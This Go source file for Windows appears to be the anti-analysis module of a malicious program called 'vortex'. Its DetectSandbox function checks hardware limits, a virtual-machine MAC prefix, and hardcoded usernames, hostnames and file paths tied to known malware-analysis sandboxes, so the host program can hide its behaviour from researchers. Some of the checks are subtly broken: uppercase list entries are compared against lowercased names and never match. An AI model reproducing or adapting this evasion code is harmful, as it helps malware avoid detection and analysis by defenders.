//go:build windows

package envtype

import (
	"errors"
	"os"
	"vortex/opsysinfo"
	"strings"
)

var osInfo = opsysinfo.MachineSpecs()

func isFileExist(fName string) bool {

	if _, err := os.Stat(fName); !errors.Is(err, os.ErrNotExist) {
		return true
	}

	return false
}

func chkSusFiles() bool {

	susFiles := []string{
		"C:\\email.doc", "C:\\email.htm", "C:\\123\\email.doc", "C:\\a\\foobar.gif",
		"C:\\123\\email.docx", "C:\\a\\foobar.bmp", "C:\\a\\foobar.doc",
	}

	for i := range susFiles {
		if isFileExist(susFiles[i]) {
			return true
		}
	}

	return false
}

func chkSusUsers() bool {

	susUsers := []string{
		"IT-ADMIN", "Paul Jones", "WALKER", "Sandbox", "Timmy",
		"John Doe", "CurrentUser", "sand box", "maltest", "malware",
		"virus", "malwarelab", "Emily", "test", "malware-analysis",
		"7SILVIA", "HANSPETER-PC", "WIN7-TRAPS", "FORTINET",
	}

	for i := range susUsers {
		if strings.Contains(strings.ToLower(osInfo.Username), susUsers[i]) || strings.Contains(strings.ToLower(osInfo.Hostname), susUsers[i]) {
			return true
		}
	}

	return false
}

func DetectSandbox() bool {

    var (
		harddisk        = opsysinfo.HardDriveInfo()
		macInfo         = opsysinfo.LocalNetworkInfo()
		_, width, hight = opsysinfo.ScreenResolution()
	)

	switch {
	case osInfo.Procs <= 3:
		return true
	case osInfo.RAM <= 1024:
		return true
	case harddisk.DiskTotalSpace <= 70:
		return true
	case width <= 500 && hight <= 500:
		return true
	case strings.HasPrefix(macInfo.MacAddress, "0A:00:27"):
		return true
	case strings.ToLower(osInfo.Username) == "wilber" && strings.HasPrefix(strings.ToLower(osInfo.Hostname), "sc"):
		return true
	case strings.ToLower(osInfo.Username) == "wilber" && strings.HasPrefix(strings.ToLower(osInfo.Hostname), "cw"):
		return true
	case strings.ToLower(osInfo.Username) == "admin" && strings.Contains(strings.ToLower(osInfo.Hostname), "klone_x64-pc"):
		return true
	case strings.ToLower(osInfo.Username) == "admin" && strings.Contains(strings.ToLower(osInfo.Hostname), "systemit") && isFileExist("C:\\Symbols\\aagmmc.pdb"):
		return true
	case strings.ToLower(osInfo.Username) == "john" && isFileExist("C:\\take_screenshot.ps1"):
		return true
	case strings.ToLower(osInfo.Username) == "john" && isFileExist("C:\\loaddll.exe"):
		return true
	case strings.ToUpper(osInfo.Hostname) == "TEQUILABOOMBOOM":
		return true
	case chkSusFiles():
		return true
	case chkSusUsers():
		return true
	default:
		return false
	}

}
